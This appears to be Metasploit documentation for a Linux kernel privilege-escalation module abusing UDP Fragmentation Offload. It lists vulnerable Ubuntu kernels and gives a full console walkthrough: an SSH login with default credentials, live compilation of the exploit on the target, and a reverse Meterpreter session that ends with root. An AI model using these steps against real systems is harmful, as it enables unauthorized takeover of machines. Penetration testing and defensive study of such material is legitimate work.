## Vulnerable Application

This module attempts to gain root privileges on Linux systems by abusing UDP Fragmentation Offload (UFO).

This module has been tested successfully on:

  * Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop
  
The following kernels are vulnerable, but untested on Ubuntu

  * Trusty 14.04
    * 4.4.0-21-generic
    * 4.4.0-22-generic
    * 4.4.0-24-generic
    * 4.4.0-28-generic
    * 4.4.0-31-generic
    * 4.4.0-34-generic
    * 4.4.0-36-generic
    * 4.4.0-38-generic
    * 4.4.0-42-generic
    * 4.4.0-45-generic
    * 4.4.0-47-generic
    * 4.4.0-51-generic
    * 4.4.0-53-generic
    * 4.4.0-57-generic
    * 4.4.0-59-generic
    * 4.4.0-62-generic
    * 4.4.0-63-generic
    * 4.4.0-64-generic
    * 4.4.0-66-generic
    * 4.4.0-67-generic
    * 4.4.0-70-generic
    * 4.4.0-71-generic
    * 4.4.0-72-generic
    * 4.4.0-75-generic
    * 4.4.0-78-generic
    * 4.4.0-79-generic
    * 4.4.0-81-generic
    * 4.4.0-83-generic
  * Xenial 16.04
    * 4.8.0-34-generic
    * 4.8.0-36-generic
    * 4.8.0-39-generic
    * 4.8.0-41-generic
    * 4.8.0-45-generic
    * 4.8.0-46-generic
    * 4.8.0-49-generic
    * 4.8.0-52-generic
    * 4.8.0-53-generic
    * 4.8.0-54-generic
    * 4.8.0-56-generic
    * 4.8.0-58-generic
    * 4.4.0-81-generic
          
### POC Issues

In the original POC exploit, a bash shell is executed with root privileges, however, in testing,
it was determined that the network stack seems to be unresponsive post exploitation to that process
and its children.  To circumvent this issue, this exploit calls a stub bash script to chmod and set
suid/sgid bits on the payload.  Then the original shell can simply execute the payload to escalate.

## Verification Steps

  1. Start msfconsole
  2. Get a shell on a vulnerable box
  3. Do: ```use exploit/linux/local/ufo_privilege_escalation```
  4. Do: ```set session [#]```
  5. Do: ```run```
  6. You should get a root shell.

## Options

  **WritableDir**

  A folder we can write files to.  Defaults to /tmp

  **COMPILE**
  
  If we should live compile on the system, or drop pre-created binaries.  Auto will determine if gcc/libs are installed to compile live on the system.  Defaults to Auto

## Scenarios

### Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop

#### Initial Access

```
resource (ubuntu.rb)> use auxiliary/scanner/ssh/ssh_login
resource (ubuntu.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (ubuntu.rb)> set username ubuntu
username => ubuntu
resource (ubuntu.rb)> set password ubuntu
password => ubuntu
resource (ubuntu.rb)> exploit
[+] 2.2.2.2:22 - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare) Linux ubuntu-desktop-14 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (1.1.1.1:45819 -> 2.2.2.2:22) at 2018-04-03 20:58:32 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Escalate

In this scenario, gcc is installed so we can live compile on the system.

```
resource (ubuntu.rb)> use exploit/linux/local/ufo_privilege_escalation
resource (ubuntu.rb)> set verbose true
verbose => true
resource (ubuntu.rb)> set session 1
session => 1
resource (ubuntu.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (ubuntu.rb)> exploit
[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 1.1.1.1:4444 
[+] Kernel 4.4.0-31-generic on "14.04" vulnerable
[*] Checking if smap is installed
[+] smap not present.
[+] gcc is installed
[*] Live compiling exploit on system
[*] Writing files to target
[*] Writing szNEyaWe to /tmp/szNEyaWe.c
[*] Max line length is 65537
[*] Writing 25590 bytes in 2 chunks of 56634 bytes (octal-encoded), using printf
[*] Next chunk is 32498 bytes
[*] Writing ZcwJhBLU to /tmp/ZcwJhBLU
[*] Max line length is 65537
[*] Writing 207 bytes in 1 chunks of 629 bytes (octal-encoded), using printf
[*] Writing cecdokdw.sh to /tmp/cecdokdw.sh
[*] Max line length is 65537
[*] Writing 67 bytes in 1 chunks of 251 bytes (octal-encoded), using printf
[*] Starting execution of priv esc, chowning and setting suid bit for payload.
[*] [.] starting
[*] [.] checking distro and kernel versions
[*] [.] kernel version '4.4.0-31-generic' detected
[*] [~] done, versions looks good
[*] [.] checking SMEP and SMAP
[*] [~] done, looks good
[*] [.] setting up namespace sandbox
[*] [~] done, namespace sandbox set up
[*] [.] KASLR bypass enabled, getting kernel addr
[*] [~] done, kernel text:   ffffffff81000000
[*] [.] commit_creds:        ffffffff8109d760
[*] [.] prepare_kernel_cred: ffffffff8109da40
[*] [.] SMEP bypass enabled, mmapping fake stack
[*] [~] done, fake stack mmapped
[*] [.] executing payload ffffffff8104516a
[*] [~] done, should be root now
[*] [.] checking if we got root
[*] [+] got r00t ^_^
[*] Executing payload
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (857352 bytes) to 2.2.2.2
[*] Sleeping before handling stage...
[*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:42382) at 2018-04-03 20:58:50 -0400

meterpreter > sysinfo
Computer     : 2.2.2.2
OS           : Ubuntu 14.04 (Linux 4.4.0-31-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: uid=1000, gid=1000, euid=0, egid=0
```
